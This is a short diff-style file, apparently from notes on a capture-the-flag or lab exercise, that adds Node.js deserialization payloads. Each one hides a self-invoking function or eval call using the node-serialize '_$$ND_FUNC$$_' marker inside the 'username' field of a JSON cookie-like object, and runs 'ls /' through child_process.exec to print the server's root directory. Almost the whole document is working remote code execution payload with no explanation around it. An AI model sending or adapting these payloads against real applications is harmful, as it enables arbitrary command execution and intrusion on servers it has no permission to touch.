@@ -1,0 +1,10 @@
+
+{"username":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });}()","isGuest":false}
+
+code exe:
+
+{"username":"
+
+[_$$ND_FUNC$$_, eval(require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }))]
+
+","isGuest":false}
